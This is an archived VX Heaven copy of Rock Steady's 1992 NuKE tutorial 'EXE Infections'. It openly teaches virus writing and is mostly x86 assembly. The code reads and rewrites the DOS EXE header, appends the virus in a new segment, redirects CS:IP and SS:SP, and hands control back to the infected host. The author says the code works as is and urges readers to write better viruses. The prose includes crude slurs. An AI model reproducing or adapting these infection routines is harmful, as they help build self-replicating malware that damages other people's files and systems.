<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Rock Steady 'EXE Infections' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Rock Steady"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rock Steady,EXE Infections, word, buffer, rock, infect, write, part, loaded, exes, register, nuke, stacks, routine, error, push, exit"/>
<meta name="Description" content="We must admit there are HUGE amount of Lame Viruses out there. Ever wonder why so many people talk about the AIDS virus? Its a fucken over writting virus. Its HUGE in size and its written in PASCAL. Please! Have a little more respect for the virus world. What happened to that old Bulgarian Spirit? That too has died. Bulgaria isn't writting as many top viruses as it used to! Or are we in for a surprise? (USSR Kicks!)Well to help people in advancing their Virus programming ability I will try to explain that basics in Infecting an EXE file. There are several ways to infect an EXE file. And I have tried several types. The best one I have programmed is the one you'll see. In Basic, it will infect EXEs by starting a new segment, only for the virus. This will infect EXEs over the size of 64k, and it is alot less complicated.."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"4faad1141832a8c6999fb385719fc6bebee5a40a-1498756221-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrs05.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>EXE Infections</h1><p><a href="/lib/?lang=en&amp;author=Rock%20Steady"> Rock Steady</a><br/> <em><a href="/vx.php?fid=338#f338">Nuke Info Journal [4]</a></em><br/> <em>August 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrs05.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs05">Back to index</a>] [<a href="/lib/vrs05.html#disqus_thread">Comments</a>]<br/> 
<h2>PART I. Infection Process</h2>
<p>We must admit there are HUGE amount of Lame Viruses out there. Ever wonder why so many people talk about the AIDS virus? Its a fucken over writting virus. Its HUGE in size and its written in PASCAL. Please! Have a little more respect for the virus world. What happened to that old Bulgarian Spirit? That too has died. Bulgaria isn't writting as many top viruses as it used to! Or are we in for a surprise? (USSR Kicks!)</p>
<p>Well to help people in advancing their Virus programming ability I will try to explain that basics in Infecting an EXE file. There are several ways to infect an EXE file. And I have tried several types. The best one I have programmed is the one you'll see. In Basic, it will infect EXEs by starting a new segment, only for the virus. This will infect EXEs over the size of 64k, and it is alot less complicated..</p>
<p>Before we can begin we must know a few things, about EXEs. Let's say a .COM file has been loaded to segment address 1234:0000. When the COM file runs its code is limited to 1234:0000 to 1234:FFFF (64k). In the other end EXE files, are basicaly several COMs in one. Where EXE files can set up DATA struct in one segment, CODE in another, and STACK in another. EXEs can have an unlimited amount of Segments, its limitation is Memory Availablity. And the EXE file keeps track of these Segments, with an EXE header, telling DOS what segments start where, How big the file is, the amount of memory needed to run. the EXE header is the first few bytes of the EXE file. Though if you use DEBUG to load an EXE file you will not run into the EXE header, as DEBUG uses the EXE header to load its CS:IP regesters with, the SS:SP and so on. Though you can view the EXE header with debug if you Rename that EXE file. So just do `DEBUG FILENAME.EQE' Just rename an EXE, the extension can be anything you wish, however don't go and rename it to COM or BIN, these are reserved Extensions, and debug treats them differently, Example if you rename it to COM debug will load the IP regester as 0100h. The EXE header is Usually 28 bytes, though it is save as 32 Bytes Long. As the size of the EXE header (Offset 8) is in multiple 16 bytes, so 28 bytes will have to be covered in (16*2)! But the last 4 bytes are unused, by dos, Though Doesn't STOP a VIRUS from using it? Just a poping ideas out in the open. Anyhow this is how the EXE header consists, of..</p>
<table border="1" cellspacing="0" cellpadding="0" summary="EXE header">
<tr><th>START(hex)</th><th>OFFSETS(dec)</th><th>DISCRIPTIONS</th></tr>
<tr><td>00 </td><td>00</td><td>Always 4D 5A. Marks this file as an .EXE file</td></tr>
<tr><td>*02</td><td>02</td><td>Remainder after dividing load module's size by 512</td></tr>
<tr><td>*04</td><td>04</td><td>Size of file in 512 byte pages</td></tr>
<tr><td>06 </td><td>06</td><td>Number of relocation table entries</td></tr>
<tr><td>@08</td><td>08</td><td>Size of header in paragraphs (16 bytes)</td></tr>
<tr><td>0A </td><td>10</td><td>Minumum number of paragraphs required after loaded program</td></tr>
<tr><td>0C </td><td>12</td><td>Maximum number of paragraphs required after loaded program</td></tr>
<tr><td>*0E</td><td>14</td><td>(SS) Offset of Stack Segment in Load module in paragraphs</td></tr>
<tr><td>*10</td><td>16</td><td>SP regester loaded with this word</td></tr>
<tr><td>12 </td><td>18</td><td>Negative sum (ignore overflow) of all words in file (CRC)</td></tr>
<tr><td>*14</td><td>20</td><td>IP register loaded with this word</td></tr>
<tr><td>*16</td><td>22</td><td>(CS) Offset of Code Segment in load module in paragraphs</td></tr>
<tr><td>18 </td><td>24</td><td>Offset of first relocation item.</td></tr>
<tr><td>1A </td><td>26</td><td>Overlay number. If no overlays used, this is 0</td></tr>
</table>
<p><em>* = Will be Edited by our Virus</em></p>
<p><em>@ = Needed to help our reconstruction of the EXE header</em></p>
<p>First thing to do is read the EXE header for the file to be infected! That can be resolved by...</p>
<pre class="source">
     mov     ah,3fh                 ; Read from File BTW: BX=File Handle
     mov     cx,1ch                 ; Read 1Ch Bytes (28)
     mov     dx,offset ds:[buffer]  ; Put it in our Buffer we set up!
     int     21h                    ; Call the Dos to do it.
     jc      error_exit             ; Error accured, Jmp to an Exit Routine
 buffer  db      1Ch DUP (?)     ;This is how to set up your buffer.
 exe_ip  dw      0       ;This is were you will save the original
 exe_cs  dw      0       ;Registers from the EXE header!
 exe_sp  dw      0       ;Put all theses DWs &amp; DBs at the end of
 exe_ss  dw      0       ;you file, with all the others...
</pre>
<p>Next, after reading the first 28 bytes, you will need to set your file pointers to the end of the file.</p>
<pre class="source">
     mov     ax,4202h        ; Move Read/Write Pointer to End of File
     xor     cx,cx           ; plus offset (CX:DX)! So make sure CX:DX
     xor     dx,dx           ; are ZERO or else it will go further than
     int     21h             ; the End of File!
     jc      error_exit      ; Also test for errors! Be a Smart Virus!
</pre>
<p>After bringing your virus to the end, you may start the infection process...</p>
<pre class="source">
 ;Remember BX = File Handle  DX:AX Pointer Location (EOF)
     cmp    word ptr cs:[buffer],5A4Dh  ; Is file an .EXE?
                                  /\ Reverse double word format
     jnz    error_exit           ;Exit its NOT an .EXE file!
     mov    cx,word ptr cs:[buffer+14h]  ;IP register Read
     mov    word ptr cs:[exe_ip],cx      ;Save IP Register
     mov    cx,word ptr cs:[buffer+16h]  ;CS Register Read
     mov    word ptr cs:[exe_cs],cx      ;Save CS Register
     mov    cx,word ptr cs:[buffer+10h]  ;SP Register Read
     mov    word ptr cs:[exe_sp],cx      ;Save SP Register
     mov    cx,word ptr cs:[buffer+0Eh]  ;SS Register Read
     mov    word ptr cs:[exe_ss],cx      ;Save SS Register
</pre>
<p>The following finds new CS:IP and SS:SP registers. It will create a new segment, and CS:IP will point to the beginning of the Virus. If you have other code, and the virus beginning is further down the First byte, just add the number of Bytes to AX.</p>
<pre class="source">
     push   ax
     push   dx
     call   Find_New_Offsets     ;Refer to it at the END of this Text
     sub    dx,word ptr cs:[buffer+8h]  ;Minus CS offset by EXE header!
     mov    word ptr cs:[buffer+16h],dx ;Save new CS Register
     mov    word ptr cs:[buffer+14h],ax ;Save new IP Register
     pop    dx
     pop    ax           ; Restore Original DX:AX Point Location (EOF)
     add    ax,virus_size      ; .STACKs are usually at the end of the code
                               ; in the EXEs, since our virus is now at the
                               ; End, we must move it after our virus, thus
                               ; it back at the END of the File!
     adc    dx,0         ;Add with Carry Flag!
     push   ax
     push   dx                          ;Save new EOF pointer Location
     call   Find_New_Offsets            ;Get NEW offsets for SS:SP
     sub    dx,word ptr cs:[buffer+8h]  ;Subtract EXE header from File Size
                                        ;as it should not be counted!
     add    ax,40h                      ;Move Stacks a little after EOF
     mov    word ptr cs:[buffer+0Eh],dx ;Save new SS Register for Stacks
     mov    word ptr cs:[buffer+10h],ax ;Save new SP Register for Stacks
     pop    dx
     pop    ax           ;Restore Original EOF (With Virus Counted)
     push   bx
     push   cx
     mov    cl,7                 ;In Simple, here we are figuring out
     shl    dx,cl                ;the New File Size in 512byte pages
     add    bx,ax                ;Now Rather than using the DIV and
     mov    cl,9                 ;MOD function, I used this one because
     shr    bx,cl                ;It is alot FASTER for the Processor!
     add    dx,bx                ;The Result is exactly same, But
     and    ax,1FFh              ;Shifting bits, results of the
     jz     Its_Even             ;Same function when dealing with base
     inc    dx                   ;16 numbers!
 Its_Even:            ;Read PeterNorton's Advanced ASM Language for
     pop    cx        ;more neat short cuts for the above!
     pop    bx
     mov    word ptr cs:[buffer+2h],ax   ;Remainder after of 512 pages
     mov    word ptr cs:[buffer+4h],dx   ;New File Size in 512 pages
 Now we are Ready to write the virus to the EXE File! (Yeah!)
     mov    ah,40h                 ;Write to File
     mov    dx,offset init_Virus   ;This is the BEGINNING offset of your
                                   ;Virus! (Look at NuKE PoX v1.1)
     mov    cx,Virus_size          ;Virus Size
     int    21h
     jc     error_exit             ;Error Exit dude...
     mov    ax,4200h               ;Move File Pointer to the BEGINNING
     xor    cx,cx                  ;of the EXE so, we may now write the
     xor    dx,dx                  ;EXE header!
     int    21h
     mov    ah,40h                ;Write to File
     mov    dx,offset ds:[buffer] ;Write all the stuff in the EXE_Header
     mov    cx,1Ch                ;CX=number of bytes to write
     int    21h                   ;Do it!

 ;  finds new Offsets for CS:IP &amp; SS:SP Registers
 Find_New_Offsets        PROC    NEAR
         push    bx
         push    cx
         mov     cl,0Ch              ;(c) Rock Steady/NuKE
         shl     dx,cl               ; I'm dividing here....
         mov     bx,ax
         mov     cl,4                ; And multiply by 16 hear
         shr     bx,cl
         add     dx,bx
         and     ax,0Fh
         pop     cx
         pop     bx
         retn
 Find_New_Offsets        ENDP
</pre>
<pre>
                         Rock Steady / NuKE
</pre>
<p>PS: This code works 100% as is! (Resident Virus) For Non-Residents add a location pointer! Besides, Why the Hell are you write a non-Ressy Virus? You Gay? Look at `NuKE PoX V1.1' sources to see this working!</p>
<h2>Part II</h2>
<p>The first part consisted on how to Infect the EXE file, from a resident virus. However, that is only HALF the code and understanding needed for EXE infectors. The part to follow, is on how to give control back to the original EXE file. This is one part of EXE infectors, that mostly EVERY ONE tend to forget to point out. Big tickle, you know how to infect the EXE, but can you make the original EXE run after its infection? Do you know how to restore the registers we took from the EXE header? Anyhow lets get going...</p>
<p>If the Infected EXE file is now executed, the first Line of Code it will encounter will be the first byte of our Virus. Since CS:IP have been changed in the header (Part I) to point to our Virus. The first thing we will need to do, is set up a Variable offset, (As I call it). Basically when TASM compiles our virus, all variables and other data locations are given a FIX address. Though in the case of the Virus this is NOT GOOD as viruses, tend to append themselves, and therefore variables are never in the same location...</p>
<pre class="source">
 Fig 1.
   (Original ASM Source)
           CALL   doit_Now             ;Call PUSHes CS:IP addresses
 doit_now: POP    BP                   ;POP in BP the IP register
           SUB    BP,offset doit_now   ;Make it EQUAL 0 for first Compile!
           MOV    AX,word ptr cs:[variable+BP] ;BP=0 now it works!
           ...
 variable  dd     55
</pre>
<p>When TASM Compiles the above Code it turns it into Fig 2. (Below)</p>
<pre class="source">
 Fig 2.                          Fig 3.
   (Virus Just Compiled)                (Virus Infect to a file)
 1234:0100   CALL  1234:0103          1234:0100  JMP  500
 1234:0103   POP   BP                 1234:0102  ...   (Infect File)
 1234:0104   SUB   BP,0103                       ...      ''    ''
 1234:0107   MOV   AX,[0200+BP]       1234:0200  ...      ''    ''
             ...                                 ...      ''    ''
 1234:0200   dd    55                 1234:0500  CALL 1234:0503
                                      1234:0503  POP  BP       (BP=503)
                                      1234:0504  SUB  BP,0103  (BP=400)
                                      1234:0507  MOV  AX,[0200+BP]
                                                 ...      (200+BP=600)
                                      1234:0600  dd   55
</pre>
<p>Later when the Virus infects a File, it will represent Fig 3. Now, when the CALL command is executed, it PUSHes into the Stacks the NEXT CS:IP so when it has to RETurn, all it has to do is POP back the CS:IP to know exactly where it left off! So we can take advantage of the command, by POPing back ourselves, thus this will give us the NEXT byte from the CALL command. which as you see, in the examples is our POP BP statement.</p>
<p>However when the Virus is Freshly Compiled, all Registers values are GOOD, so that is why we must make BP=0 the first time, as the variables were set according to the sources, so no adjustment needed, though when we infect a file, this BP Variable Pointer come ALIVE! (View Fig 3. + Fig 2.)</p>
<p>Boy, That was the HARDEST part of that, Now if you found that simple pat yourself on the back, as that is the only `BIG' Conflict people tend to disregard or forget. So any time while you are NOT resident but infected on the file, and you are running code from the infected file just use the that BP Variable Pointer, for any data being loaded... Now lets put the routine together, along with the routine to EXECUTE the original EXE file</p>
<pre class="source">
 ; After the Virus Has moved a copy of itself in memory, Control must be
 ; Given back to the Original EXE file we just infected... This is the
 ; Routine to do it..
 exit_exe_file:
         mov     bx,word ptr cs:[buffer+22][bp]  ;Loads CS register
         mov     ax,cs                           ;Move current CS in AX
         sub     ax,bx                           ;Subtract for alinment
         mov     dx,ax
         add     ax,word ptr cs:[exe_cs][bp]     ;Get ORIGINAL CS
         add     dx,word ptr cs:[exe_ss][bp]     ;Get ORIGINAL SS
         mov     bx,word ptr cs:[exe_ip][bp]     ;Get ORIGINAL IP
         mov     word ptr cs:[fuck_yeah][bp],bx  ;Put IP
         mov     word ptr cs:[fuck_yeah+2][bp],ax ;Put CS (Reverse Order)
         mov     ax,word ptr cs:[exe_sp][bp]     ;Get ORIGNAL SP
         mov     word ptr cs:[Rock_fix1][bp],dx  ;Put in SS
         mov     word ptr cs:[Rock_fix2][bp],ax  ;Put in SP
         db      0B8h     ;The Byte `B80000' is really a MOV AX,????
 Rock_Fix1:               ;???? is the Value of SS that we will put into
         dw      0        ;THIS LINE!
         cli                     ;Disable Interrupts (No Jamming)
         mov     ss,ax           ;Mov the AX (really SS) into SS register
         db      0BCh    ;Byte `BC0000' is really a MOV SP,????
 Rock_Fix2:              ;???? is the Value of SP that we will put into
         dw      0       ;THIS LINE!!
         sti                     ;Enable Interrupts
         db      0EAh    ;The Byte `EA00000000' is a JMP CS:IP How ever
 fuck_Yeah:              ;IP comes FIRST then CS (Reverse Order) And then
         dd      0       ;the Virus does the JMP CS:IP to the Original
                         ; Simple huh?
 ; To see this as a HOLE Virus look at `NuKE PoX V1.1' Virus Sources Codes
 ; Made by me (Rock Steady) As you can see the Code is ORGINAL, and nothing
 ; that looks like any of them Sources we see around. Though I give it to
 ; you to use.
</pre>
<pre>
                         Rock Steady / NuKE
   `One, Two, One, Two, One, Two... Come On Get into that Olympic Spirit'
     `Lose Them pounds, Get Rid of that unwanted FAT of them Drives...'
</pre>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs05">Back to index</a>] [<a href="/lib/vrs05.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrs05">de</a><a href="/lib/index.php?lang=en&amp;id=vrs05">en</a><a href="/lib/index.php?lang=es&amp;id=vrs05">es</a><a href="/lib/index.php?lang=it&amp;id=vrs05">it</a><a href="/lib/index.php?lang=fr&amp;id=vrs05">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrs05">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrs05">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrs05">ua</a></div>
</body>
</html>
